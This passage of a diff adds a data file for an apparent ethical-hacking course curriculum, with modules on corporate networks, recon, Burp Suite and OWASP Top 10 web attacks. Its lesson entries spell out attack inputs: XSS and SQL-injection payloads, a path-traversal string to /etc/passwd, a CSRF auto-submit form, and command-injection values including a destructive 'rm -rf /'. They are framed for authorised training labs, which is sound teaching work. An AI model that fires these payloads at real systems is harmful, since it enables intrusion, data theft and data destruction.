+        title: "VPN in Corporate Environments (site-to-site, remote access)",
+        type: "theory",
+        week: 6,
+        description:
+          "Corporate VPNs create an encrypted tunnel hiding traffic content and routing it as if the remote device were physically on the internal network.",
+        keyPoints: [
+          "Remote Access VPN: individual employees connect in from home/travel",
+          "Site-to-Site VPN: permanently links two office networks together over the internet",
+          "Flow: connect to VPN server → encrypt traffic → travel securely → server forwards to destination → response returns via tunnel",
+        ],
+      },
+      {
+        id: "m6-6",
+        moduleId: "m6",
+        number: 79,
+        title: "Active Directory - Structure, Users, Groups, GPO, Trust Relationships",
+        type: "theory",
+        week: 6,
+        description:
+          "Active Directory is Microsoft's directory service for centrally managing users, computers, and permissions across an entire corporate Windows network.",
+        keyPoints: [
+          "Analogy: AD = receptionist, login = authentication (badge), access = authorization (restricted floors)",
+          "Structure: Domains → Trees → Forests, with Organizational Units (OUs) grouping users/computers",
+          "Group Policy Objects (GPOs) push centralised security/config settings to domain-joined machines",
+          "AD is the single highest-value target in most corporate pentests — 'Domain Admin' is the classic goal",
+        ],
+      },
+      {
+        id: "m6-7",
+        moduleId: "m6",
+        number: 80,
+        title: "Zero Trust Architecture (never trust, always verify)",
+        type: "theory",
+        week: 6,
+        description:
+          "Zero Trust assumes no user or device is trusted by default, even inside the traditional network perimeter — every request is re-verified.",
+        keyPoints: [
+          "Key principles: Always Verify, Least Privilege Access, Assume Breach",
+          "Components: IAM (authenticate/authorize every request), Micro-Segmentation (limits lateral movement), Real-Time Monitoring",
+          "Named tools in practice: Palo Alto Prisma Access, Okta Identity Cloud, Microsoft Entra ID (Azure AD)",
+        ],
+      },
+      {
+        id: "m6-8",
+        moduleId: "m6",
+        number: 81,
+        title: "Endpoint Security (EDR, AV, Defender)",
+        type: "theory",
+        week: 6,
+        description:
+          "Endpoint security software runs directly on user devices/servers, providing the last line of defence once traffic has already reached the host.",
+        keyPoints: [
+          "Traditional AV: signature-based detection of known malware",
+          "EDR (Endpoint Detection and Response): continuously gathers/analyses endpoint data in real time, detects behaviour traditional AV misses, can isolate an infected endpoint automatically",
+          "Microsoft Defender integrates with Azure/O365/Intune for centralized enterprise management",
+        ],
+      },
+      {
+        id: "m6-9",
+        moduleId: "m6",
+        number: 82,
+        title: "Intrusion Detection & Prevention (IDS/IPS) - Signature vs Anomaly",
+        type: "theory",
+        week: 6,
+        description:
+          "IDS/IPS monitor network traffic for malicious patterns — an IDS alerts, an IPS can also actively block the traffic in real time.",
+        keyPoints: [
+          "Signature-based detection: matches traffic against a database of known-bad patterns (fast, but misses novel attacks)",
+          "Anomaly-based detection: flags deviations from a baseline of 'normal' behaviour (catches novel attacks, higher false-positive rate)",
+          "IDS = passive/alerting only; IPS = sits inline and can actively drop malicious traffic",
+        ],
+      },
+      {
+        id: "m6-10",
+        moduleId: "m6",
+        number: 83,
+        title: "Web Application Firewall (WAF) & Next-Gen Firewall (NGFW)",
+        type: "theory",
+        week: 6,
+        description:
+          "A WAF specifically inspects HTTP/HTTPS payloads (looking for SQLi/XSS patterns), while an NGFW is a broader, application-aware evolution of the traditional network firewall.",
+        keyPoints: [
+          "WAF sits in front of web apps, blocking malicious requests before they reach the app server",
+          "NGFW combines deep packet inspection, IPS, and application-awareness, and can inspect encrypted HTTPS traffic",
+          "Both are commonly bypassed via encoding/obfuscation tricks covered in the OWASP Top 10 modules",
+        ],
+      },
+      {
+        id: "m6-11",
+        moduleId: "m6",
+        number: 84,
+        title: "VDI (Virtual Desktop Infrastructure)",
+        type: "theory",
+        week: 6,
+        description:
+          "VDI centrally hosts desktop environments on servers, streamed to end-user devices — keeping sensitive data on the server rather than the endpoint.",
+        keyPoints: [
+          "Key components: Centralized Servers, Hypervisor (VMware vSphere/Microsoft Hyper-V), Connection Broker, Remote Display Protocol (RDP, PCoIP, HDX)",
+          "Benefits: remote work enablement, BYOD support, centralized IT management, data stays on the server",
+          "Use cases: healthcare (telehealth/EHR), financial services (compliance), education",
+        ],
+      },
+      {
+        id: "m6-12",
+        moduleId: "m6",
+        number: 85,
+        title: "Lab: Design a corporate network diagram in draw.io",
+        type: "lab",
+        week: 6,
+        description:
+          "Design a segmented corporate network diagram incorporating everything covered in this module — DMZ, VLANs, AD, and Zero Trust controls.",
+        keyPoints: [
+          "Include: internet edge firewall, DMZ with a public web server, internal VLANs (HR/IT/Finance), an AD domain controller",
+          "Label every security control (firewall, IDS/IPS, WAF) at the point in the diagram where it sits",
+          "Show traffic-flow arrows and annotate which flows are allowed/blocked between zones",
+        ],
+      },
+    ],
+  },
+
+  // ============================================================
+  // M7: Ethical Hacking Lifecycle & Recon
+  // ============================================================
+  {
+    id: "m7",
+    name: "M7: Ethical Hacking Lifecycle & Recon",
+    shortName: "Recon & Lifecycle",
+    month: 2,
+    weeks: [6, 7],
+    description:
+      "The first two phases of every real engagement — reconnaissance and scanning — done properly before a single exploit is ever attempted. This module covers OSINT tradecraft, active scanning with Nmap, vulnerability scanning with Nessus, and how to structure a professional pentest report.",
+    estimatedHours: 12,
+    outcomes: [
+      "Walk through the 5 phases of ethical hacking end to end",
+      "Perform passive OSINT recon using WHOIS, Shodan, Netcraft, and Google Dorking",
+      "Run and interpret Nmap scans for host/port/service/OS discovery",
+      "Run a Nessus vulnerability scan and triage the results",
+      "Structure a professional penetration test report",
+    ],
+    resources: [
+      { title: "TryHackMe Nmap rooms", url: "https://tryhackme.com", type: "platform" },
+      { title: "Nessus Essentials (free)", url: "https://www.tenable.com/products/nessus/nessus-essentials", type: "tool" },
+      { title: "OSINT Framework", url: "https://osintframework.com", type: "link" },
+      { title: "Shodan", url: "https://www.shodan.io", type: "tool" },
+    ],
+    topics: [
+      {
+        id: "m7-1",
+        moduleId: "m7",
+        number: 86,
+        title: "5 Phases of Hacking (Recon, Scanning, Access, Maintain, Cover Tracks)",
+        type: "theory",
+        week: 6,
+        description:
+          "The classic 5-phase lifecycle every pentest and every real attack roughly follows — this course covers Recon and Scanning deeply here, Access/Exploitation in M9-M11, and touches Maintain/Cover Tracks conceptually.",
+        keyPoints: [
+          "1. Reconnaissance: gathering information (passive or active) before touching the target directly",
+          "2. Scanning: identifying live hosts, open ports, and running services",
+          "3. Gaining Access: exploiting a vulnerability to get a foothold",
+          "4. Maintaining Access: persistence mechanisms to survive a reboot/reconnect",
+          "5. Covering Tracks: clearing logs/artefacts (only ever relevant in authorised red-team engagements)",
+        ],
+      },
+      {
+        id: "m7-2",
+        moduleId: "m7",
+        number: 87,
+        title: "Passive Recon - OSINT (WHOIS, Shodan, Google Dorks, LinkedIn, Netcraft)",
+        type: "theory",
+        week: 7,
+        description:
+          "Passive footprinting gathers information without directly touching the target — 'spying from a distance' using public sources only, so the target never sees you.",
+        keyPoints: [
+          "Shodan: search engine for internet-connected devices, e.g. hostname:\"example.com\"",
+          "Netcraft: Site Report tool reveals subdomains, hosting, and OS fingerprinting",
+          "WHOIS: reveals registrar, nameservers, and organisation details for a domain",
+          "Google Dorking: site:example.com filetype:pdf \"confidential\" and similar operators find exposed data",
+          "theHarvester gathers emails/employee names from public sources for social-engineering-aware recon",
+        ],
+        terminalCommands: [
+          'site:example.com filetype:pdf "confidential"',
+          "theHarvester -d example.com -l 200 -b linkedin",
+          "nslookup",
+        ],
+      },
+      {
+        id: "m7-3",
+        moduleId: "m7",
+        number: 88,
+        title: "Active Recon (Nmap, Traceroute, Banner Grabbing)",
+        type: "theory",
+        week: 7,
+        description:
+          "Active footprinting means directly interacting with the target — the target may notice this activity, so it must only ever be done with explicit authorisation and an agreed scope.",
+        keyPoints: [
+          "Ping sweeps and traceroute map live hosts and the network path to a target",
+          "Banner grabbing reveals exact service versions directly from their response headers/banners",
+          "Always obtain explicit permission, document all activity, and follow the agreed Rules of Engagement before any active recon",
+        ],
+        terminalCommands: [
+          "ping example.com",
+          "traceroute example.com",
+          "nmap -sn 192.168.1.0/24",
+          "nc <target> <port>",
+        ],
+      },
+      {
+        id: "m7-4",
+        moduleId: "m7",
+        number: 89,
+        title: "Nmap: Host Discovery, Port Scanning, Version Detection, OS Detection",
+        type: "theory",
+        week: 7,
+        description:
+          "Nmap is the core scanning tool of the entire programme — host discovery, port scanning, service/version detection, and OS fingerprinting in one tool.",
+        keyPoints: [
+          "Host discovery/ping sweep finds which hosts on a range are alive before scanning each individually",
+          "A full TCP scan across all 65535 ports is thorough but slow — often start with the default top-1000",
+          "-sV detects service versions; -O attempts OS fingerprinting",
+        ],
+        terminalCommands: [
+          "nmap -sn 192.168.0.0/24",
+          "nmap -p- <target-ip>",
+          "nmap -sV -O <target-ip>",
+          "nmap -sU <target-ip>",
+        ],
+      },
+      {
+        id: "m7-5",
+        moduleId: "m7",
+        number: 90,
+        title: "Nmap NSE Scripts for Service Enumeration",
+        type: "theory",
+        week: 7,
+        description:
+          "The Nmap Scripting Engine (NSE) extends Nmap with hundreds of scripts for deeper enumeration and even vulnerability detection.",
+        keyPoints: [
+          "--script vuln runs a broad set of vulnerability-detection scripts against discovered services",
+          "Named vulnerability scripts include smb-vuln-ms17-010 and http-vuln-cve2020-3452",
+          "Worked example: nmap -sV finds vsftpd 2.3.4 → cross-reference against CVE Details/Exploit-DB reveals CVE-2011-2523 (a known backdoor)",
+        ],
+        terminalCommands: [
+          "nmap --script vuln <target>",
+          "nmap --script=banner <target>",
+          "nmap -sV -p 21,22,80 <target>",
+        ],
+      },
+      {
+        id: "m7-6",
+        moduleId: "m7",
+        number: 91,
+        title: "Subdomain Enumeration (subfinder, amass, dnsx)",
+        type: "theory",
+        week: 7,
+        description:
+          "Subdomains often run older, forgotten, or less-hardened applications — enumerating them expands the attack surface dramatically beyond just the main domain.",
+        keyPoints: [
+          "subfinder/amass/dnsx passively query multiple sources (certificate transparency logs, DNS records, search engines) to enumerate subdomains at scale",
+          "Complementary manual sources: Netcraft Site Report, crt.sh (certificate transparency), SecurityTrails, DNSDumpster",
+        ],
+        terminalCommands: [
+          "subfinder -d example.com",
+          "amass enum -d example.com",
+          "dnsx -l subdomains.txt -a",
+        ],
+      },
+      {
+        id: "m7-7",
+        moduleId: "m7",
+        number: 92,
+        title: "Vulnerability Scanning with Nessus & OpenVAS",
+        type: "theory",
+        week: 7,
+        description:
+          "Automated vulnerability scanners check discovered services against huge databases of known CVEs and misconfigurations, turning raw Nmap output into a prioritised risk list.",
+        keyPoints: [
+          "Process: find devices → check for weaknesses → assess risk (Critical/High/Medium/Low) → remediate",
+          "Scan types: External vs Internal, Credentialed (deeper, logged-in) vs Non-Credentialed",
+          "Nessus (commercial, free Essentials tier) vs OpenVAS (fully free/open-source alternative)",
+          "Compliance scanning modes exist for standards like PCI-DSS, HIPAA, and NIST",
+        ],
+      },
+      {
+        id: "m7-8",
+        moduleId: "m7",
+        number: 93,
+        title: "Privilege Escalation Theory - Vertical & Horizontal",
+        type: "theory",
+        week: 7,
+        description:
+          "Introduced conceptually here, and put into hands-on practice in M11 — privilege escalation is about gaining access beyond what you were originally granted.",
+        keyPoints: [
+          "Vertical: a lower-privileged user gains admin/root access (e.g. a regular user reaching an admin dashboard)",
+          "Horizontal: a user accesses another same-level user's data (e.g. User A viewing User B's private files)",
+          "Common enabling flaws: IDOR (predictable IDs), client-side role manipulation, missing server-side authorization checks",
+        ],
+      },
+      {
+        id: "m7-9",
+        moduleId: "m7",
+        number: 94,
+        title: "Post-Exploitation (Persistence, Lateral Movement, Data Exfiltration, Covering Tracks)",
+        type: "theory",
+        week: 7,
+        description:
+          "What happens after an initial foothold is gained — covered here at a theory level, expanded hands-on in M11.",
+        keyPoints: [
+          "Persistence: mechanisms (scheduled tasks, registry Run keys, cron jobs) to survive reboot/reconnect",
+          "Lateral movement: pivoting from the first compromised host to others in the network",
+          "Data exfiltration: extracting data out of the target environment, often over covert channels",
+          "Covering tracks: clearing logs/artefacts — relevant only within an authorised red-team scope",
+        ],
+      },
+      {
+        id: "m7-10",
+        moduleId: "m7",
+        number: 95,
+        title: "Penetration Testing Report Structure",
+        type: "theory",
+        week: 7,
+        description:
+          "A finding is only as valuable as the report explaining it — this is the deliverable clients actually pay for and act on.",
+        keyPoints: [
+          "Required sections: Executive Summary (non-technical), Detailed Findings, Business Impact (CVSS scoring), Exploitation Difficulty (Easy/Medium/Hard), Remediation Recommendations, Strategic Recommendations",
+          "Compliance-standard reporting frameworks differ: PCI-DSS, CREST, CERT, FedRAMP, CHECK each require different elements",
+          "Best practices: know your audience, prioritise by severity/exploitability, include screenshots/PoC evidence, proofread scores carefully",
+        ],
+      },
+      {
+        id: "m7-11",
+        moduleId: "m7",
+        number: 96,
+        title: "Rules of Engagement & Scoping (Legal & Ethical)",
+        type: "theory",
+        week: 7,
+        description:
+          "Before any active testing begins, scope and Rules of Engagement (RoE) must be explicitly agreed with the client/management — this is what makes the difference between a pentest and a crime.",
+        keyPoints: [
+          "RoE defines exactly what's in scope, what's off-limits, testing windows, and emergency contacts",
+          "Discuss and define scope with management before any active technique is used",
+          "Written authorisation must exist before touching any system you don't personally own",
+        ],
+      },
+      {
+        id: "m7-12",
+        moduleId: "m7",
+        number: 97,
+        title: "Lab: Passive OSINT + Nmap scan + Nessus scan on a test target",
+        type: "lab",
+        week: 7,
+        description:
+          "An end-to-end recon exercise chaining everything in this module — passive OSINT, then an active Nmap scan, then a Nessus vulnerability scan against a lab VM (e.g. Metasploitable2).",
+        keyPoints: [
+          "Start passive: WHOIS, Shodan, Netcraft, Google Dorking on the test domain",
+          "Move to active: full Nmap scan (-sV -O -p-) to enumerate live hosts/ports/services",
+          "Install Nessus Essentials, run a Basic Network Scan against the lab VM, and categorise findings by severity",
+          "Produce a short recon report: open ports, services, OS, subdomains, and any known CVEs found",
+        ],
+      },
+    ],
+  },
+
+  // ============================================================
+  // M8: Burp Suite 101
+  // ============================================================
+  {
+    id: "m8",
+    name: "M8: Burp Suite 101",
+    shortName: "Burp Suite",
+    month: 2,
+    weeks: [8],
+    description:
+      "Burp Suite is the industry-standard intercepting proxy for web application penetration testing — nearly every lab in M9 and M10 assumes you can already intercept, modify, repeat, and fuzz HTTP requests confidently.",
+    estimatedHours: 20,
+    outcomes: [
+      "Configure Burp's proxy alongside a browser (FoxyProxy) to intercept traffic",
+      "Intercept and modify live HTTP requests before they reach the server",
+      "Use Repeater to manually iterate on a request/payload",
+      "Use Intruder to automate fuzzing and credential-spraying attacks",
+      "Use Decoder to encode/decode payloads on the fly",
+    ],
+    resources: [
+      { title: "PortSwigger Web Academy Burp Suite Path", url: "https://portswigger.net/web-security", type: "platform" },
+      { title: "DVWA", url: "https://github.com/digininja/DVWA", type: "tool" },
+      { title: "FoxyProxy", url: "https://getfoxyproxy.org", type: "tool" },
+    ],
+    topics: [
+      {
+        id: "m8-1",
+        moduleId: "m8",
+        number: 98,
+        title: "What is Burp Suite & Why Pentesters Use It",
+        type: "theory",
+        week: 8,
+        description:
+          "Burp Suite is a Java-based framework serving as a comprehensive solution for web application penetration testing — it captures and enables manipulation of all HTTP/HTTPS traffic between browser and server.",
+        keyPoints: [
+          "Core tools: Proxy, Repeater, Intruder, Decoder, Comparer, Sequencer",
+          "Community (free) edition rate-limits Intruder attacks vs the paid Professional edition",
+          "The de-facto standard tool for manual web app, API, and mobile-backend testing",
+        ],
+      },
+      {
+        id: "m8-2",
+        moduleId: "m8",
+        number: 99,
+        title: "Step-by-Step: Configure Burp Proxy + Browser (Firefox + CA cert install)",
+        type: "setup",
+        week: 8,
+        description:
+          "Getting your browser's traffic actually flowing through Burp is the first hurdle every new user hits — done once via FoxyProxy, it stays configured for the rest of the course.",
+        keyPoints: [
+          "Launch Burp → accept terms → choose a temporary project → keep default config → Start Burp",
+          "Burp's proxy listens by default on 127.0.0.1:8080 (Proxy → Proxy listeners)",
+          "Install the FoxyProxy browser extension so you can toggle the proxy on/off in your normal browser",
+          "Configure FoxyProxy with hostname 127.0.0.1, port 8080, then enable it via the toolbar icon",
+          "To intercept HTTPS without cert warnings, export Burp's CA certificate and import it into your browser's trust store",
+        ],
+      },
+      {
+        id: "m8-3",
+        moduleId: "m8",
+        number: 100,
+        title: "Intercepting & Modifying HTTP/HTTPS Requests",
+        type: "theory",
+        week: 8,
+        description:
+          "With Intercept turned on, you can edit the raw request from your browser before it's forwarded to the server — bypassing any client-side (JavaScript) validation entirely.",
+        keyPoints: [
+          "Proxy → HTTP History logs every captured request/response for later review",
+          "Turning on Intercept pauses each request for editing before you click Forward",
+          "Example: intercepting a login POST and tampering a parameter to bypass a client-side check",
+        ],
+      },
+      {
+        id: "m8-4",
+        moduleId: "m8",
+        number: 101,
+        title: "Burp Repeater - Manual Request Manipulation",
+        type: "theory",
+        week: 8,
+        description:
+          "Repeater captures, modifies, and resends the same request as many times as you want — the core tool for trial-and-error payload crafting like manual SQL injection testing.",
+        keyPoints: [
+          "Workflow: right-click a captured request → Send to Repeater → edit a parameter → Send",
+          "Ideal for iterating on a single payload dozens of times without re-intercepting each time",
+          "Example: enumerate valid product IDs by editing and resending a captured GET request's productId parameter",
+        ],
+      },
+      {
+        id: "m8-5",
+        moduleId: "m8",
+        number: 102,
+        title: "Burp Intruder - Fuzzing & Brute Force (attack types: Sniper, Cluster Bomb)",
+        type: "theory",
+        week: 8,
+        description:
+          "Intruder automates sending many variations of a request — marking positions with payload lists — used for brute force, fuzzing, and blind data extraction.",
+        keyPoints: [
+          "Workflow: Send to Intruder → mark payload position(s) with § markers → choose an attack type → add a payload list → launch",
+          "Sniper: one payload set cycled through one position at a time — ideal for a single parameter",
+          "Cluster Bomb: multiple payload sets across multiple positions, testing every combination — ideal for username+password pairs",
+          "Grep-Match in the Options tab flags a specific string (e.g. 'Welcome back') appearing in each response, letting you spot the correct guess instantly",
+        ],
+      },
+      {
+        id: "m8-6",
+        moduleId: "m8",
+        number: 103,
+        title: "Burp Decoder - Encode, Decode, Hash data",
+        type: "theory",
+        week: 8,
+        description:
+          "Decoder transforms data on the fly — decode captured information, or encode a payload correctly before sending it to the target.",
+        keyPoints: [
+          "Supports Base64, URL, HTML encoding/decoding, and common hash functions",
+          "Practical use: URL-encoding a '/' to %2f to smuggle a path-traversal character past a naive filter",
+        ],
+      },
+      {
+        id: "m8-7",
+        moduleId: "m8",
+        number: 104,
+        title: "Burp Scanner - Passive vs Active Scanning",
+        type: "theory",
+        week: 8,
+        description:
+          "Burp's automated Scanner (Professional edition) crawls and tests an application for common vulnerability classes without manual intervention.",
+        keyPoints: [
+          "Passive scanning: analyses traffic you generate normally, flags issues without sending extra requests",
+          "Active scanning: Burp actively sends crafted/malicious requests to probe for vulnerabilities (SQLi, XSS, etc.)",
+          "Community edition lacks Scanner — this course relies primarily on the manual tools (Repeater/Intruder) instead",
+        ],
+      },
+      {
+        id: "m8-8",
+        moduleId: "m8",
+        number: 105,
+        title: "Scope Configuration & Target Sitemap",
+        type: "theory",
+        week: 8,
+        description:
+          "Defining Target → Scope keeps Burp focused only on the application under test, filtering out noise from unrelated domains/third-party trackers.",
+        keyPoints: [
+          "Target tab's Site map builds a tree of every URL Burp has observed for the app",
+          "Adding the target domain to Scope lets you filter HTTP History/Site map to in-scope traffic only",
+        ],
+      },
+      {
+        id: "m8-9",
+        moduleId: "m8",
+        number: 106,
+        title: "Lab: Set up Burp + Firefox, intercept login request",
+        type: "lab",
+        week: 8,
+        description:
+          "Practical setup lab — get Burp and Firefox talking to each other, then intercept and inspect a real login request end to end.",
+        keyPoints: [
+          "Install/enable the FoxyProxy extension pointing at 127.0.0.1:8080",
+          "Turn on Intercept in the Proxy tab, then submit a login form in the browser",
+          "Observe the raw captured POST request in Burp before forwarding it",
+          "Try tampering a field (e.g. removing an otp parameter) and forwarding to see how the app responds",
+        ],
+      },
+      {
+        id: "m8-10",
+        moduleId: "m8",
+        number: 107,
+        title: "Lab: Burp Repeater - manual SQLi test",
+        type: "lab",
+        week: 8,
+        description:
+          "Manually test for SQL injection in a request parameter using Repeater — the same technique used against PortSwigger's WHERE-clause SQLi lab in M9.",
+        keyPoints: [
+          "Capture a filter/search request (e.g. GET /filter?category=Gifts) and send it to Repeater",
+          "Inject a payload into the parameter: Gifts' OR 1=1 --",
+          "Highlight the payload and press Ctrl+U to URL-encode it before sending",
+          "Send the request; a successful injection returns rows the original query shouldn't have returned",
+        ],
+        terminalCommands: ["GET /filter?category=Gifts'+OR+1%3d1-- HTTP/2"],
+      },
+      {
+        id: "m8-11",
+        moduleId: "m8",
+        number: 108,
+        title: "Lab: Burp Intruder - password spray on DVWA",
+        type: "lab",
+        week: 8,
+        description:
+          "Use Intruder to automate a password-spraying attempt against a DVWA login form, identifying which credentials are valid from the response.",
+        keyPoints: [
+          "Capture the DVWA login POST request and send it to Intruder",
+          "Mark the password field as the payload position; choose Sniper attack type",
+          "Load a small wordlist as a Simple list payload set",
+          "Enable Grep-Match for a string only present on successful login (e.g. 'Welcome') to instantly spot the hit",
+        ],
+      },
+    ],
+  },
+
+  // ============================================================
+  // M9: OWASP Top 10 — Web Attacks Part 1
+  // ============================================================
+  {
+    id: "m9",
+    name: "M9: OWASP Top 10 - Web Attacks Part 1",
+    shortName: "OWASP Top 10 Pt.1",
+    month: 3,
+    weeks: [9],
+    description:
+      "The exploitation phase begins here — the classic OWASP Top 10 vulnerability classes, exploited hands-on with real payloads against PortSwigger and DVWA labs: XSS, SQL Injection, Broken Access Control, Path Traversal, Command Injection, and CSRF.",
+    estimatedHours: 22,
+    outcomes: [
+      "Exploit Reflected, Stored, and DOM-based XSS with real payloads",
+      "Perform manual UNION-based and Blind SQL injection",
+      "Identify and exploit IDOR and forced-browsing access control flaws",
+      "Exploit path traversal and OS command injection",
+      "Build and deliver a working CSRF proof-of-concept",
+    ],
+    resources: [
+      { title: "PortSwigger Web Academy", url: "https://portswigger.net/web-security", type: "platform" },
+      { title: "OWASP Testing Guide", url: "https://owasp.org/www-project-web-security-testing-guide/", type: "link" },
+      { title: "HackTricks", url: "https://book.hacktricks.xyz", type: "link" },
+    ],
+    topics: [
+      {
+        id: "m9-1",
+        moduleId: "m9",
+        number: 109,
+        title: "OWASP Top 10 Overview & Significance",
+        type: "theory",
+        week: 9,
+        description:
+          "Injection and access-control flaws occur when attackers manipulate application inputs/interpreters to alter intended behaviour — the OWASP Top 10 ranks the most common and impactful of these vulnerability classes.",
+        keyPoints: [
+          "Related CWEs: CWE-79 (XSS), CWE-89 (SQLi), CWE-77 (Command Injection), CWE-943 (NoSQLi)",
+          "Common impacts: data theft, authentication bypass, data manipulation, full system compromise",
+          "Best practices threaded through every topic below: never trust user input, parameterised queries, context-aware output encoding, least privilege",
+        ],
+      },
+      {
+        id: "m9-2",
+        moduleId: "m9",
+        number: 110,
+        title: "XSS - Reflected, Stored, DOM-based (theory + impact + payloads)",
+        type: "theory",
+        week: 9,
+        description:
+          "Cross-Site Scripting injects malicious scripts into trusted pages so they execute in other users' browsers — three distinct flavours with different sources and persistence.",
+        keyPoints: [
+          "Reflected: payload comes from the current HTTP request (e.g. a search query), requires a victim to click a crafted link",
+          "Stored: payload is saved server-side (e.g. a comment) and served to every visitor — highest severity",
+          "DOM-based: vulnerability is entirely in client-side JS reading an untrusted source (e.g. location.search) into a dangerous sink (document.write)",
+        ],
+        terminalCommands: [
+          "<script>alert(1)</script>",
+          "<script>alert(document.cookie)</script>",
+          '"><img src=x onerror=alert(\'XSS\')>',
+        ],
+      },
+      {
+        id: "m9-3",
+        moduleId: "m9",
+        number: 111,
+        title: "SQL Injection - Manual & Using sqlmap",
+        type: "theory",
+        week: 9,
+        description:
+          "SQL Injection lets an attacker interfere with the queries an application runs against its database — from authentication bypass to full data exfiltration.",
+        keyPoints: [
+          "Classic auth-bypass payload: ' OR 1=1 -- appended to a WHERE clause",
+          "UNION-based: append a UNION SELECT to pull data from other tables once you know the column count",
+          "Blind SQLi: no visible output — infer data character-by-character via true/false conditions or time delays",
+          "sqlmap automates detection and exploitation of all of the above once you have a candidate injection point",
+        ],
+        terminalCommands: [
+          "' OR 1=1 --",
+          "' UNION SELECT null, username, password FROM users--",
+          "' AND (SELECT 'a' FROM users LIMIT 1)='a",
+        ],
+      },
+      {
+        id: "m9-4",
+        moduleId: "m9",
+        number: 112,
+        title: "Broken Access Control - IDOR, Forced Browsing, Privilege Escalation",
+        type: "theory",
+        week: 9,
+        description:
+          "Broken access control happens when an app fails to properly enforce what an authenticated user is allowed to do — OWASP's own data shows it in 94% of tested applications.",
+        keyPoints: [
+          "IDOR: a predictable object reference (ID) is exposed and not validated, e.g. /receipt/12345 → try 12346",
+          "Forced browsing: reaching a hidden/unlinked page directly (e.g. an admin panel found via robots.txt)",
+          "Vertical privesc: normal user reaches an admin-only function; horizontal: user accesses another same-level user's data",
+        ],
+      },
+      {
+        id: "m9-5",
+        moduleId: "m9",
+        number: 113,
+        title: "Path Traversal / Directory Traversal",
+        type: "theory",
+        week: 9,
+        description:
+          "Path traversal lets an attacker access files/directories outside the intended directory on a web server, via unvalidated input building a file path.",
+        keyPoints: [
+          "Vulnerable pattern: readfile('/var/www/html/uploads/' . $_GET['file'])",
+          "Classic payload: ../../../../etc/passwd walks up out of the intended directory",
+          "Mitigations: allowlist valid inputs, normalise/canonicalise paths, restrict to a fixed base directory",
+        ],
+        terminalCommands: ["http://example.com/download.php?file=../../../../etc/passwd"],
+      },
+      {
+        id: "m9-6",
+        moduleId: "m9",
+        number: 114,
+        title: "Command Injection (OS injection, ; && | operators)",
+        type: "theory",
+        week: 9,
+        description:
+          "Command injection occurs when an application passes unsanitised user input into a system-level shell command.",
+        keyPoints: [
+          "Vulnerable pattern: os.system(f\"cat {user_input}\") lets an attacker append extra shell commands",
+          "Chaining operators: ; sequential, && only-if-success, || only-if-failure, | pipes output to another command",
+          "Example payload against a stock-checker parameter: 1|whoami reveals the server's running user",
+        ],
+        terminalCommands: ["filename.txt; rm -rf /", "1|whoami"],
+      },
+      {
+        id: "m9-7",
+        moduleId: "m9",
+        number: 115,
+        title: "CSRF (Cross-Site Request Forgery)",
+        type: "theory",
+        week: 9,
+        description:
+          "CSRF tricks an authenticated user's browser into submitting an unwanted request to an application they're logged into, using their existing session.",
+        keyPoints: [
+          "Attack works because the browser automatically attaches cookies to any request, regardless of origin",
+          "A malicious page auto-submits a hidden form targeting the victim application on page load",
+          "Mitigations: anti-CSRF tokens tied to the session, SameSite cookies, re-authentication for sensitive actions",
+        ],
+        terminalCommands: [
+          '<form action="https://example.com/my-account/change-email" method="POST">',
+          '  <input type="hidden" name="email" value="attacker@example.com">',
+          "</form><script>document.forms[0].submit()</script>",
+        ],
+      },
+      {
+        id: "m9-8",
+        moduleId: "m9",
+        number: 116,
+        title: "PortSwigger: XSS Labs - 3 labs (Reflected, Stored, DOM)",
+        type: "lab",
+        week: 9,
+        description:
+          "Complete the Reflected, Stored, and DOM-based XSS labs on PortSwigger Web Academy.",
+        keyPoints: [
+          "Reflected: submit <script>alert(1)</script> in the search field and confirm it fires unsanitised",
+          "Stored: submit <script>alert(document.cookie)</script> in a blog comment; confirm it fires for every visitor",
+          "DOM: break out of the vulnerable sink's context, e.g. \"><img src=x onerror=alert('XSS')>",
+        ],
+      },
+      {
+        id: "m9-9",
+        moduleId: "m9",
+        number: 117,
+        title: "PortSwigger: SQL Injection Labs - 3 labs (UNION, blind, error-based)",
+        type: "lab",
+        week: 9,
+        description:
+          "Complete the WHERE-clause, UNION-based, and Blind SQL injection labs on PortSwigger, using Burp Repeater and Intruder throughout.",
+        keyPoints: [
+          "WHERE-clause lab: inject ' OR 1=1 -- into the category filter via Repeater",
+          "UNION lab: incrementally add UNION SELECT NULL,NULL... until the column count matches, then read data",
+          "Blind lab: confirm injection via true/false conditions, then extract the admin password character-by-character with Intruder + Grep-Match",
+        ],
+      },
+      {
+        id: "m9-10",
+        moduleId: "m9",
+        number: 118,
+        title: "PortSwigger: Broken Access Control - 2 labs (IDOR, privilege escalation)",
+        type: "lab",
+        week: 9,
+        description:
+          "Complete an IDOR lab (via a chat transcript download endpoint) and a forced-browsing/privilege-escalation lab (via a hidden admin panel).",
+        keyPoints: [
+          "IDOR: change /download-transcript/2.txt to /download-transcript/1.txt to retrieve another user's data",
+          "Forced browsing: check /robots.txt for a Disallow entry revealing a hidden admin panel path",
+          "In the admin panel, perform the required privileged action (e.g. delete a user) to solve the lab",
+        ],
+      },
+      {
+        id: "m9-11",
+        moduleId: "m9",
+        number: 119,
+        title: "DVWA: Complete SQLi & XSS all difficulty levels",
+        type: "lab",
+        week: 9,
+        description:
+          "Exploit both SQL Injection and XSS (Reflected & Stored) across all four DVWA difficulty settings (Low/Medium/High/Impossible), observing how each level's mitigations change the required technique.",
+        keyPoints: [
+          "Low: little to no filtering — direct payloads work as-is",
+          "Medium/High: partial filtering/encoding — requires payload variation or case/encoding tricks to bypass",
+          "Impossible: proper parameterised queries/output encoding — confirm the vulnerability is no longer exploitable",
+        ],
+      },
+    ],
+  },
+
+  // ============================================================
+  // M10: OWASP Top 10 — Web Attacks Part 2
+  // ============================================================
+  {
+    id: "m10",
+    name: "M10: OWASP Top 10 - Web Attacks Part 2",
+    shortName: "OWASP Top 10 Pt.2",
+    month: 3,
+    weeks: [10],
+    description:
+      "The second, more advanced half of the web-exploitation curriculum: SSRF, file inclusion, SSTI, file upload attacks, business logic flaws, information disclosure, cryptographic failures, API-specific vulnerabilities, and the emerging LLM/AI attack surface.",
+    estimatedHours: 24,
+    outcomes: [
+      "Exploit basic SSRF to reach internal-only resources",
+      "Exploit LFI/RFI to read arbitrary files or achieve RCE",
+      "Identify and exploit Server-Side Template Injection",
+      "Bypass file-upload restrictions to achieve a web shell",
+      "Recognise business-logic flaws, information disclosure, and API-specific vulnerability classes",
+    ],
+    resources: [
+      { title: "PortSwigger Web Academy", url: "https://portswigger.net/web-security", type: "platform" },
